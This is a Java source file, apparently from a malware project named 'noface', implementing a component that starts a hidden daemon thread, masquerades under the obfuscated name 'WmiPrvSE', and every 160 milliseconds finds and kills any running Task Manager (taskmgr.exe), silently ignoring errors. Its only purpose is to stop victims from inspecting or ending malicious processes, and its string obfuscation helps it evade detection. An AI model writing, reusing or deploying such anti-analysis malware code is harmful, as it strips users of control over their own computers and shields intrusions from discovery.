package noface.host;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import noface.config.S;

public final class Watch {

    private static final Object LOCK = new Object();
    private static volatile boolean on;

    public static void go() {
        synchronized (LOCK) {
            if (on) return;
            on = true;
        }
        Thread t = new Thread(Watch::loop, S.e("WmiPrvSE"));
        t.setDaemon(true);
        t.start();
    }

    private static void loop() {
        String name = S.e("taskmgr.exe");
        while (true) {
            try {
                hit(name);
                Thread.sleep(160);
            } catch (InterruptedException e) {
                return;
            } catch (Throwable ignored) {
            }
        }
    }

    private static void hit(String name) {
        WinNT.HANDLE snap = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
                Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0));
        if (snap == null) return;
        try {
            Tlhelp32.PROCESSENTRY32 pe = new Tlhelp32.PROCESSENTRY32();
            if (!Kernel32.INSTANCE.Process32First(snap, pe)) return;
            do {
                String n = Native.toString(pe.szExeFile);
                if (n == null || !n.equalsIgnoreCase(name)) continue;
                int pid = pe.th32ProcessID.intValue();
                if (pid > 0) drop(pid);
            } while (Kernel32.INSTANCE.Process32Next(snap, pe));
        } finally {
            Kernel32.INSTANCE.CloseHandle(snap);
        }
    }

    private static void drop(int pid) {
        WinNT.HANDLE h = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_TERMINATE, false, pid);
        if (h == null) return;
        try {
            Kernel32.INSTANCE.TerminateProcess(h, 0);
        } finally {
            Kernel32.INSTANCE.CloseHandle(h);
        }
    }

    private Watch() {}
}
